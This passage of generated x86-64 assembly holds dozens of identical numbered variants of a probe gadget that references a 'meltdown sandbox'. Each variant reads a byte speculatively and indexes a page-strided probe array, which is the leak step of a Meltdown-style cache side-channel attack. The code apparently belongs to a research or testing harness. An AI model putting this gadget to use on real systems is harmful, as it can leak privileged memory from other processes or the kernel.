	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 161
.Lprobe_one_win0_var161:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 162
.Lprobe_one_win0_var162:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 163
.Lprobe_one_win0_var163:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 164
.Lprobe_one_win0_var164:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 165
.Lprobe_one_win0_var165:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 166
.Lprobe_one_win0_var166:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 167
.Lprobe_one_win0_var167:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 168
.Lprobe_one_win0_var168:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 169
.Lprobe_one_win0_var169:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 170
.Lprobe_one_win0_var170:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 171
.Lprobe_one_win0_var171:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 172
.Lprobe_one_win0_var172:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 173
.Lprobe_one_win0_var173:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 174
.Lprobe_one_win0_var174:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 175
.Lprobe_one_win0_var175:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 176
.Lprobe_one_win0_var176:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 177
.Lprobe_one_win0_var177:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 178
.Lprobe_one_win0_var178:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 179
.Lprobe_one_win0_var179:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 180
.Lprobe_one_win0_var180:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 181
.Lprobe_one_win0_var181:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 182
.Lprobe_one_win0_var182:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 183
.Lprobe_one_win0_var183:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 184
.Lprobe_one_win0_var184:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 185
.Lprobe_one_win0_var185:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 186
.Lprobe_one_win0_var186:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 187
.Lprobe_one_win0_var187:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 188
.Lprobe_one_win0_var188:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 189
.Lprobe_one_win0_var189:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 190
.Lprobe_one_win0_var190:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 191
.Lprobe_one_win0_var191:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 192
.Lprobe_one_win0_var192:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 193
.Lprobe_one_win0_var193:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 194
.Lprobe_one_win0_var194:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 195
.Lprobe_one_win0_var195:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 196
.Lprobe_one_win0_var196:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 197
.Lprobe_one_win0_var197:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 198
.Lprobe_one_win0_var198:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 199
.Lprobe_one_win0_var199:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 200
.Lprobe_one_win0_var200:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 201
.Lprobe_one_win0_var201:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 202
.Lprobe_one_win0_var202:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 203
.Lprobe_one_win0_var203:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 204
.Lprobe_one_win0_var204:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 205
.Lprobe_one_win0_var205:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 206
.Lprobe_one_win0_var206:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 207
.Lprobe_one_win0_var207:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 208
.Lprobe_one_win0_var208:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 209
.Lprobe_one_win0_var209:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 210
.Lprobe_one_win0_var210:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 211
.Lprobe_one_win0_var211:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 212
.Lprobe_one_win0_var212:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 213
.Lprobe_one_win0_var213:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 214
.Lprobe_one_win0_var214:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 215
.Lprobe_one_win0_var215:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 216
.Lprobe_one_win0_var216:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 217
.Lprobe_one_win0_var217:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 218
.Lprobe_one_win0_var218:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 219
.Lprobe_one_win0_var219:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 220
.Lprobe_one_win0_var220:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 221
.Lprobe_one_win0_var221:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 222
.Lprobe_one_win0_var222:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 223
.Lprobe_one_win0_var223:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 224
.Lprobe_one_win0_var224:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 225
.Lprobe_one_win0_var225:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 226
.Lprobe_one_win0_var226:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 227
.Lprobe_one_win0_var227:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 228
.Lprobe_one_win0_var228:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 229
.Lprobe_one_win0_var229:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 230
.Lprobe_one_win0_var230:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 231
.Lprobe_one_win0_var231:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 232
.Lprobe_one_win0_var232:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 233
.Lprobe_one_win0_var233:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 234
.Lprobe_one_win0_var234:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 235
.Lprobe_one_win0_var235:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 236
.Lprobe_one_win0_var236:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 237
.Lprobe_one_win0_var237:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 238
.Lprobe_one_win0_var238:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 239
.Lprobe_one_win0_var239:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 240
.Lprobe_one_win0_var240:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 241
.Lprobe_one_win0_var241:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 242
.Lprobe_one_win0_var242:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 243
.Lprobe_one_win0_var243:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 244
.Lprobe_one_win0_var244:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 245
.Lprobe_one_win0_var245:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 246
.Lprobe_one_win0_var246:
	popq	%rax
	addq	$32, %rsp
